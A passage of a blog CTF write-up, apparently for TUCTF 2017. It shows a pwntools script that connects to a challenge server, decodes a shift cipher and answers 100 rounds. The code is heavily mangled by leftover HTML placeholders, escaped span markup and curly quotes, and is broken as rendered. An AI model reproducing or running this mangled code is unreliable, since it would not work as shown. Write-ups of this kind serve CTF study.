+<!-- raw HTML omitted -->print<!-- raw HTML omitted --> <!-- raw HTML omitted -->vuln2<!-- raw HTML omitted --><!-- raw HTML omitted -->.<!-- raw HTML omitted --><!-- raw HTML omitted -->recv<!-- raw HTML omitted --><!-- raw HTML omitted -->(<!-- raw HTML omitted --><!-- raw HTML omitted -->1024<!-- raw HTML omitted --><!-- raw HTML omitted -->)<!-- raw HTML omitted -->
+<!-- raw HTML omitted --><!-- raw HTML omitted --></p>
+<!-- raw HTML omitted -->
+<!-- raw HTML omitted -->
+<!-- raw HTML omitted -->
+<!-- raw HTML omitted -->
+<!-- raw HTML omitted -->
+<p><!-- raw HTML omitted -->never<!-- raw HTML omitted --> <!-- raw HTML omitted -->=<!-- raw HTML omitted --> <!-- raw HTML omitted -->remote<!-- raw HTML omitted --><!-- raw HTML omitted -->(<!-- raw HTML omitted --><!-- raw HTML omitted -->&quot;neverending.tuCTF.com&quot;<!-- raw HTML omitted --><!-- raw HTML omitted -->,<!-- raw HTML omitted --><!-- raw HTML omitted -->12345<!-- raw HTML omitted --><!-- raw HTML omitted -->)<!-- raw HTML omitted -->
+<!-- raw HTML omitted -->char_set<!-- raw HTML omitted --> <!-- raw HTML omitted -->=<!-- raw HTML omitted --> <!-- raw HTML omitted -->&quot;abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789 !<!-- raw HTML omitted --><!-- raw HTML omitted -->&quot;<!-- raw HTML omitted --><!-- raw HTML omitted -->#$<!-- raw HTML omitted --><!-- raw HTML omitted -->%<!-- raw HTML omitted --><!-- raw HTML omitted -->&amp;<!-- raw HTML omitted --><!-- raw HTML omitted -->'<!-- raw HTML omitted --><!-- raw HTML omitted -->()*+,-./:;&lt;=&gt;?@[<!-- raw HTML omitted --><!-- raw HTML omitted -->\<!-- raw HTML omitted --><!-- raw HTML omitted -->]^_`{|}~<!-- raw HTML omitted --><!-- raw HTML omitted -->&lt;/span&gt;<!-- raw HTML omitted -->s&quot;<!-- raw HTML omitted --></p>
+<p><!-- raw HTML omitted -->def<!-- raw HTML omitted --> <!-- raw HTML omitted -->round1<!-- raw HTML omitted --><!-- raw HTML omitted -->(<!-- raw HTML omitted --><!-- raw HTML omitted -->char<!-- raw HTML omitted --><!-- raw HTML omitted -->=<!-- raw HTML omitted --><!-- raw HTML omitted -->&quot;A&quot;<!-- raw HTML omitted --><!-- raw HTML omitted -->):<!-- raw HTML omitted -->
+<!-- raw HTML omitted -->never<!-- raw HTML omitted --><!-- raw HTML omitted -->.<!-- raw HTML omitted --><!-- raw HTML omitted -->sendlineafter<!-- raw HTML omitted --><!-- raw HTML omitted -->(<!-- raw HTML omitted --><!-- raw HTML omitted -->&quot;text:&ldquo;<!-- raw HTML omitted --><!-- raw HTML omitted -->,<!-- raw HTML omitted --><!-- raw HTML omitted -->char<!-- raw HTML omitted --><!-- raw HTML omitted -->)<!-- raw HTML omitted -->
+<!-- raw HTML omitted -->enc_base<!-- raw HTML omitted --> <!-- raw HTML omitted -->=<!-- raw HTML omitted --> <!-- raw HTML omitted -->never<!-- raw HTML omitted --><!-- raw HTML omitted -->.<!-- raw HTML omitted --><!-- raw HTML omitted -->recvline<!-- raw HTML omitted --><!-- raw HTML omitted -->()<!-- raw HTML omitted --><!-- raw HTML omitted -->.<!-- raw HTML omitted --><!-- raw HTML omitted -->split<!-- raw HTML omitted --><!-- raw HTML omitted -->(<!-- raw HTML omitted --><!-- raw HTML omitted -->&quot;is &ldquo;<!-- raw HTML omitted --><!-- raw HTML omitted -->)[<!-- raw HTML omitted --><!-- raw HTML omitted -->1<!-- raw HTML omitted --><!-- raw HTML omitted -->]<!-- raw HTML omitted -->
+<!-- raw HTML omitted -->enc_msg<!-- raw HTML omitted --> <!-- raw HTML omitted -->=<!-- raw HTML omitted --> <!-- raw HTML omitted -->never<!-- raw HTML omitted --><!-- raw HTML omitted -->.<!-- raw HTML omitted --><!-- raw HTML omitted -->recvline<!-- raw HTML omitted --><!-- raw HTML omitted -->()<!-- raw HTML omitted --><!-- raw HTML omitted -->.<!-- raw HTML omitted --><!-- raw HTML omitted -->split<!-- raw HTML omitted --><!-- raw HTML omitted -->(<!-- raw HTML omitted --><!-- raw HTML omitted -->&quot;is &ldquo;<!-- raw HTML omitted --><!-- raw HTML omitted -->)[<!-- raw HTML omitted --><!-- raw HTML omitted -->1<!-- raw HTML omitted --><!-- raw HTML omitted -->]<!-- raw HTML omitted -->
+<!-- raw HTML omitted -->enc_msg<!-- raw HTML omitted --> <!-- raw HTML omitted -->=<!-- raw HTML omitted --> <!-- raw HTML omitted -->enc_msg<!-- raw HTML omitted --><!-- raw HTML omitted -->.<!-- raw HTML omitted --><!-- raw HTML omitted -->split<!-- raw HTML omitted --><!-- raw HTML omitted -->(<!-- raw HTML omitted --><!-- raw HTML omitted -->&rdquo; decrypted?<!-- raw HTML omitted --><!-- raw HTML omitted -->\n<!-- raw HTML omitted --><!-- raw HTML omitted -->&quot;<!-- raw HTML omitted --><!-- raw HTML omitted -->)[<!-- raw HTML omitted --><!-- raw HTML omitted -->0<!-- raw HTML omitted --><!-- raw HTML omitted -->]<!-- raw HTML omitted -->
+<!-- raw HTML omitted -->log<!-- raw HTML omitted --><!-- raw HTML omitted -->.<!-- raw HTML omitted --><!-- raw HTML omitted -->info<!-- raw HTML omitted --><!-- raw HTML omitted -->(<!-- raw HTML omitted --><!-- raw HTML omitted -->&quot;ENC BASE : -&gt; {}&ldquo;<!-- raw HTML omitted --><!-- raw HTML omitted -->.<!-- raw HTML omitted --><!-- raw HTML omitted -->format<!-- raw HTML omitted --><!-- raw HTML omitted -->(<!-- raw HTML omitted --><!-- raw HTML omitted -->enc_base<!-- raw HTML omitted --><!-- raw HTML omitted -->))<!-- raw HTML omitted -->
+<!-- raw HTML omitted -->log<!-- raw HTML omitted --><!-- raw HTML omitted -->.<!-- raw HTML omitted --><!-- raw HTML omitted -->info<!-- raw HTML omitted --><!-- raw HTML omitted -->(<!-- raw HTML omitted --><!-- raw HTML omitted -->&quot;ENC MSG : -&gt; {}&ldquo;<!-- raw HTML omitted --><!-- raw HTML omitted -->.<!-- raw HTML omitted --><!-- raw HTML omitted -->format<!-- raw HTML omitted --><!-- raw HTML omitted -->(<!-- raw HTML omitted --><!-- raw HTML omitted -->enc_msg<!-- raw HTML omitted --><!-- raw HTML omitted -->))<!-- raw HTML omitted -->
+<!-- raw HTML omitted -->cal<!-- raw HTML omitted --> <!-- raw HTML omitted -->=<!-- raw HTML omitted --> <!-- raw HTML omitted -->ord<!-- raw HTML omitted --><!-- raw HTML omitted -->(<!-- raw HTML omitted --><!-- raw HTML omitted -->char<!-- raw HTML omitted --><!-- raw HTML omitted -->)<!-- raw HTML omitted --> <!-- raw HTML omitted -->-<!-- raw HTML omitted --> <!-- raw HTML omitted -->ord<!-- raw HTML omitted --><!-- raw HTML omitted -->(<!-- raw HTML omitted --><!-- raw HTML omitted -->enc_base<!-- raw HTML omitted --><!-- raw HTML omitted -->[<!-- raw HTML omitted --><!-- raw HTML omitted -->0<!-- raw HTML omitted --><!-- raw HTML omitted -->])<!-- raw HTML omitted -->
+<!-- raw HTML omitted -->dec<!-- raw HTML omitted --> <!-- raw HTML omitted -->=<!-- raw HTML omitted --> <!-- raw HTML omitted -->&quot;&ldquo;<!-- raw HTML omitted --><!-- raw HTML omitted -->.<!-- raw HTML omitted --><!-- raw HTML omitted -->join<!-- raw HTML omitted --><!-- raw HTML omitted -->([<!-- raw HTML omitted --><!-- raw HTML omitted -->chr<!-- raw HTML omitted --><!-- raw HTML omitted -->(<!-- raw HTML omitted --><!-- raw HTML omitted -->ord<!-- raw HTML omitted --><!-- raw HTML omitted -->(<!-- raw HTML omitted --><!-- raw HTML omitted -->b<!-- raw HTML omitted --><!-- raw HTML omitted -->)<!-- raw HTML omitted --> <!-- raw HTML omitted -->+<!-- raw HTML omitted --> <!-- raw HTML omitted -->cal<!-- raw HTML omitted --><!-- raw HTML omitted -->)<!-- raw HTML omitted --> <!-- raw HTML omitted -->for<!-- raw HTML omitted --> <!-- raw HTML omitted -->b<!-- raw HTML omitted --> <!-- raw HTML omitted -->in<!-- raw HTML omitted --> <!-- raw HTML omitted -->enc_msg<!-- raw HTML omitted --><!-- raw HTML omitted -->])<!-- raw HTML omitted --></p>
+<pre><code>&lt;span class=&quot;n&quot;&gt;non_printable&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;[&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;chr&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;ord&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;z&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;))&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;for&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;z&lt;/span&gt; &lt;span class=&quot;ow&quot;&gt;in&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;dec&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;z&lt;/span&gt; &lt;span class=&quot;ow&quot;&gt;not&lt;/span&gt; &lt;span class=&quot;ow&quot;&gt;in&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;char_set&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt;
+&lt;span class=&quot;n&quot;&gt;printable&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;&quot;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;join&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;([&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;chr&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;ord&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;z&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;+&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;95&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;for&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;z&lt;/span&gt; &lt;span class=&quot;ow&quot;&gt;in&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;non_printable&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;z&lt;/span&gt; &lt;span class=&quot;ow&quot;&gt;not&lt;/span&gt; &lt;span class=&quot;ow&quot;&gt;in&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;char_set&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;])&lt;/span&gt;
+&lt;span class=&quot;k&quot;&gt;for&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;i&lt;/span&gt; &lt;span class=&quot;ow&quot;&gt;in&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;range&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;len&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;printable&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)):&lt;/span&gt;
+    &lt;span class=&quot;n&quot;&gt;dec&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;dec&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;replace&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;non_printable&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;i&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;],&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;printable&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;i&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;])&lt;/span&gt;
+
+&lt;span class=&quot;n&quot;&gt;non_printable2&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;[&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;chr&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;ord&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;z&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;))&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;for&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;z&lt;/span&gt; &lt;span class=&quot;ow&quot;&gt;in&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;dec&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;z&lt;/span&gt; &lt;span class=&quot;ow&quot;&gt;not&lt;/span&gt; &lt;span class=&quot;ow&quot;&gt;in&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;char_set&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt;
+&lt;span class=&quot;n&quot;&gt;printable2&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;&quot;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;join&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;([&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;chr&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;ord&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;z&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;190&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;for&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;z&lt;/span&gt; &lt;span class=&quot;ow&quot;&gt;in&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;non_printable2&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;z&lt;/span&gt; &lt;span class=&quot;ow&quot;&gt;not&lt;/span&gt; &lt;span class=&quot;ow&quot;&gt;in&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;char_set&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;])&lt;/span&gt;
+&lt;span class=&quot;k&quot;&gt;for&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;i&lt;/span&gt; &lt;span class=&quot;ow&quot;&gt;in&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;range&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;len&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;printable2&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)):&lt;/span&gt;
+    &lt;span class=&quot;n&quot;&gt;dec&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;dec&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;replace&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;non_printable2&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;i&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;],&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;printable2&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;i&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;])&lt;/span&gt;
+
+&lt;span class=&quot;n&quot;&gt;log&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;info&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;Decrypted -&amp;gt; {}&quot;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;format&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;repr&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;dec&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)))&lt;/span&gt;
+&lt;span class=&quot;n&quot;&gt;never&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;sendlineafter&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;:&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;dec&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
+</code></pre>
+<p><!-- raw HTML omitted -->for<!-- raw HTML omitted --> <!-- raw HTML omitted -->i<!-- raw HTML omitted --> <!-- raw HTML omitted -->in<!-- raw HTML omitted --> <!-- raw HTML omitted -->range<!-- raw HTML omitted --><!-- raw HTML omitted -->(<!-- raw HTML omitted --><!-- raw HTML omitted -->100<!-- raw HTML omitted --><!-- raw HTML omitted -->):<!-- raw HTML omitted -->
+<!-- raw HTML omitted -->try<!-- raw HTML omitted --><!-- raw HTML omitted -->:<!-- raw HTML omitted -->
+<!-- raw HTML omitted -->log<!-- raw HTML omitted --><!-- raw HTML omitted -->.<!-- raw HTML omitted --><!-- raw HTML omitted -->info<!-- raw HTML omitted --><!-- raw HTML omitted -->(<!-- raw HTML omitted --><!-- raw HTML omitted -->&quot;Round {0}&ldquo;<!-- raw HTML omitted --><!-- raw HTML omitted -->.<!-- raw HTML omitted --><!-- raw HTML omitted -->format<!-- raw HTML omitted --><!-- raw HTML omitted -->(<!-- raw HTML omitted --><!-- raw HTML omitted -->i<!-- raw HTML omitted --><!-- raw HTML omitted -->))<!-- raw HTML omitted -->
+<!-- raw HTML omitted -->round1<!-- raw HTML omitted --><!-- raw HTML omitted -->()<!-- raw HTML omitted -->
+<!-- raw HTML omitted -->if<!-- raw HTML omitted --> <!-- raw HTML omitted -->never<!-- raw HTML omitted --><!-- raw HTML omitted -->.<!-- raw HTML omitted --><!-- raw HTML omitted -->recvline<!-- raw HTML omitted --><!-- raw HTML omitted -->()<!-- raw HTML omitted --><!-- raw HTML omitted -->.<!-- raw HTML omitted --><!-- raw HTML omitted -->split<!-- raw HTML omitted --><!-- raw HTML omitted -->()[<!-- raw HTML omitted --><!-- raw HTML omitted -->0<!-- raw HTML omitted --><!-- raw HTML omitted -->]<!-- raw HTML omitted --> <!-- raw HTML omitted -->==<!-- raw HTML omitted --> <!-- raw HTML omitted -->&quot;Correct!&ldquo;<!-- raw HTML omitted --><!-- raw HTML omitted -->:<!-- raw HTML omitted -->
+<!-- raw HTML omitted -->log<!-- raw HTML omitted --><!-- raw HTML omitted -->.<!-- raw HTML omitted --><!-- raw HTML omitted -->info<!-- raw HTML omitted --><!-- raw HTML omitted -->(<!-- raw HTML omitted --><!-- raw HTML omitted -->&rdquo;-&gt; BENAR&quot;<!-- raw HTML omitted --><!-- raw HTML omitted -->)<!-- raw HTML omitted -->
+<!-- raw HTML omitted -->continue<!-- raw HTML omitted -->
+<!-- raw HTML omitted -->log<!-- raw HTML omitted --><!-- raw HTML omitted -->.<!-- raw HTML omitted --><!-- raw HTML omitted -->info<!-- raw HTML omitted --><!-- raw HTML omitted -->(<!-- raw HTML omitted --><!-- raw HTML omitted -->&rdquo;-&gt; SALAH&quot;<!-- raw HTML omitted --><!-- raw HTML omitted -->)<!-- raw HTML omitted -->
+<!-- raw HTML omitted -->except<!-- raw HTML omitted --><!-- raw HTML omitted -->:<!-- raw HTML omitted -->
+<!-- raw HTML omitted -->print<!-- raw HTML omitted --> <!-- raw HTML omitted -->never<!-- raw HTML omitted --><!-- raw HTML omitted -->.<!-- raw HTML omitted --><!-- raw HTML omitted -->recv<!-- raw HTML omitted --><!-- raw HTML omitted -->()<!-- raw HTML omitted -->
+<!-- raw HTML omitted -->never<!-- raw HTML omitted --><!-- raw HTML omitted -->.<!-- raw HTML omitted --><!-- raw HTML omitted -->close<!-- raw HTML omitted --><!-- raw HTML omitted -->()<!-- raw HTML omitted -->
+<!-- raw HTML omitted -->break<!-- raw HTML omitted -->
+<!-- raw HTML omitted --><!-- raw HTML omitted --></p>
+<!-- raw HTML omitted -->
+<!-- raw HTML omitted -->
+<!-- raw HTML omitted -->
+<!-- raw HTML omitted -->
+
+    </div>
+    
+      
+        <div class="pagination">
+          <div class="pagination__title">
+            <span class="pagination__title-h">Read other posts</span>
+            <hr />
+          </div>
+          <div class="pagination__buttons">
+            
+              <span class="button previous">
+                <a href="rhamaa.github.io/post/2017-12-05-tpctf-2017-write-up/">
+                  <span class="button__icon">←</span>
+                  <span class="button__text">TPCTF 2017 - Write up</span>
+                </a>
+              </span>
+            
+            
+              <span class="button next">
+                <a href="rhamaa.github.io/post/2017-11-27-tuctf-2017/">
+                  <span class="button__text">TUCTF 2017 - Writeup</span>
+                  <span class="button__icon">→</span>
+                </a>
+              </span>
+            
+          </div>
+        </div>
+      
+    
+
+
+    
+      
+        
+
+      
+    
+
+    </div>
+
+      </div>
+
+      
+        <footer class="footer">
+  <div class="footer__inner">
+    
+      <a href="/" class="logo" style="text-decoration: none;">
+  
+    <span class="logo__mark"><svg xmlns="http://www.w3.org/2000/svg" class="greater-icon" viewBox="0 0 44 44">
+  <path fill="none" d="M15 8l14.729 14.382L15 35.367"/>
+</svg>
+</span>
+    <span class="logo__text">ls</span>
+    <span class="logo__cursor"></span>
+  
+</a>
+
+      <div class="copyright">
+        <span>© 2020 Powered by <a href="https://gohugo.io" target="_blank" rel="noopener">Hugo</a></span>
+        <span>Theme created by <a href="https://twitter.com/panr" target="_blank" rel="noopener">panr</a></span>
+      </div>
+    
+  </div>
+</footer>
+
+<script src="rhamaa.github.io/assets/main.js"></script>
+<script src="rhamaa.github.io/assets/prism.js"></script>
+
+
+      
+    </div>
+
+    
+  </body>
+</html>
